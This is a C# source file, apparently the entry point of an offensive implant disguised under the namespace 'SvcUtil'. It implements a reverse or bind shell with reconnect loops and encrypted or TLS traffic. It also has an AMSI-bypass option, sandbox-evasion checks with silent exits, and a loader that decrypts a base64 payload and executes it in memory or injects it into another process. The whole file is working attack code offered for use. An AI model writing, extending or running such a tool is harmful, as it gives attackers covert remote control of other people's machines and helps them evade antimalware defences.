using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace SvcUtil
{
    internal class Program
    {
        private static string _host;
        private static int _port;
        private static string _command;
        private static byte[] _key;
        private static bool _listenMode;
        private static bool _reconnect;
        private static bool _noEncrypt;
        private static bool _scanPatch;
        private static bool _scanExplicit;
        private static bool _useTls;
        private static string _payloadB64;
        private static string _aesPassword;
        private static int _targetPid;
        private static bool _noSandbox;

        static void Main(string[] args)
        {
            // Set defaults
            _host = Config.DefaultIp;
            _port = Config.DefaultPort;
            _command = Config.DefaultCommand;
            _key = Config.DefaultTrafficKey;
            _listenMode = false;
            _reconnect = false;
            _noEncrypt = false;
            _scanPatch = false;
            _scanExplicit = false;
            _useTls = false;
            _payloadB64 = null;
            _aesPassword = null;
            _targetPid = 0;
            _noSandbox = false;

            if (!ParseArgs(args))
                return;

            if (_payloadB64 != null)
            {
                if (!_noSandbox && !EnvCheck.PassAllChecks())
                    return;

                byte[] payload;
                try
                {
                    payload = Convert.FromBase64String(_payloadB64);
                }
                catch
                {
                    return; // Invalid base64 — silent fail
                }

                // AES decryption if password provided
                if (_aesPassword != null)
                {
                    try
                    {
                        payload = AesCrypto.Decrypt(payload, _aesPassword);
                    }
                    catch
                    {
                        return; // Decryption failed — silent fail
                    }
                }

                try
                {
                    if (_targetPid > 0)
                        RemoteLoader.Inject(_targetPid, payload);
                    else
                        PayloadRunner.Execute(payload);
                }
                finally
                {
                    Array.Clear(payload, 0, payload.Length);
                }
                return;
            }

            // ── Shell mode ──────────────────────────────────────────────

            if (!_scanExplicit && ScanPatch.IsPowerShell(_command))
                _scanPatch = true;

            if (_listenMode)
                RunListenMode();
            else if (_reconnect)
                RunReverseWithReconnect();
            else
                RunReverse();
        }

        // ── Argument parsing ─────────────────────────────────────────

        private static bool ParseArgs(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLowerInvariant())
                {
                    case "-c":
                    case "--connect":
                        if (i + 2 >= args.Length) return false;
                        _host = args[++i];
                        if (!int.TryParse(args[++i], out _port)) return false;
                        break;

                    case "-l":
                    case "--listen":
                        _listenMode = true;
                        if (i + 1 >= args.Length) return false;
                        if (!int.TryParse(args[++i], out _port)) return false;
                        break;

                    case "-e":
                    case "--exec":
                        if (i + 1 >= args.Length) return false;
                        _command = args[++i];
                        break;

                    case "-k":
                    case "--key":
                        if (i + 1 >= args.Length) return false;
                        _key = Encoding.UTF8.GetBytes(args[++i]);
                        break;

                    case "-r":
                    case "--reconnect":
                        _reconnect = true;
                        break;

                    case "-n":
                    case "--no-encrypt":
                        _noEncrypt = true;
                        break;

                    case "-a":
                    case "--amsi":
                        _scanPatch = true;
                        _scanExplicit = true;
                        break;

                    case "--no-amsi":
                        _scanPatch = false;
                        _scanExplicit = true;
                        break;

                    case "--tls":
                        _useTls = true;
                        break;

                    case "-s":
                    case "--payload":
                        if (i + 1 >= args.Length) return false;
                        string sArg = args[++i];
                        if (File.Exists(sArg))
                            _payloadB64 = File.ReadAllText(sArg).Trim();
                        else
                            _payloadB64 = sArg;
                        break;

                    case "-p":
                    case "--password":
                        if (i + 1 >= args.Length) return false;
                        _aesPassword = args[++i];
                        break;

                    case "-i":
                    case "--inject":
                        if (i + 1 >= args.Length) return false;
                        string iArg = args[++i];
                        if (!int.TryParse(iArg, out _targetPid))
                        {
                            // Treat as process name — resolve to PID
                            var procs = Process.GetProcessesByName(iArg);
                            if (procs.Length > 0)
                                _targetPid = procs[0].Id;
                            else
                                return false; // Process not found
                        }
                        break;

                    case "--no-sandbox":
                        _noSandbox = true;
                        break;

                    default:
                        // Legacy positional args
                        if (i == 0 && !args[0].StartsWith("-"))
                        {
                            _host = args[0];
                            if (args.Length >= 2 && int.TryParse(args[1], out _port))
                            {
                                if (args.Length >= 3)
                                    _command = args[2];
                                return true;
                            }
                            return false;
                        }
                        return false;
                }
            }
            return true;
        }

        // ── Execution modes ──────────────────────────────────────────

        private static void RunReverse()
        {
            Socket sock = Connection.ConnectReverse(_host, _port);
            if (sock == null) return;

            IShellStream stream = CreateStream(sock);
            if (stream == null) return;

            Shell.Execute(_command, stream, _scanPatch);
        }

        private static void RunReverseWithReconnect()
        {
            while (true)
            {
                Socket sock = Connection.ConnectWithRetry(_host, _port,
                    Config.MaxReconnectAttempts);
                if (sock == null) return;

                IShellStream stream = CreateStream(sock);
                if (stream == null) return;

                Shell.Execute(_command, stream, _scanPatch);
            }
        }

        private static void RunListenMode()
        {
            Socket sock = Connection.Listen(_port);
            if (sock == null) return;

            IShellStream stream = CreateStream(sock);
            if (stream == null) return;

            Shell.Execute(_command, stream, _scanPatch);
        }

        /// <summary>
        /// Create the appropriate stream wrapper based on flags.
        /// </summary>
        private static IShellStream CreateStream(Socket sock)
        {
            if (_useTls)
            {
                var tls = new TlsStream(sock);
                if (!tls.Authenticate(_host))
                {
                    tls.Close();
                    return null;
                }
                return tls;
            }

            byte[] key = _noEncrypt
                ? new byte[] { 0x00 }
                : _key;
            return new CryptoStream(sock, key);
        }
    }
}
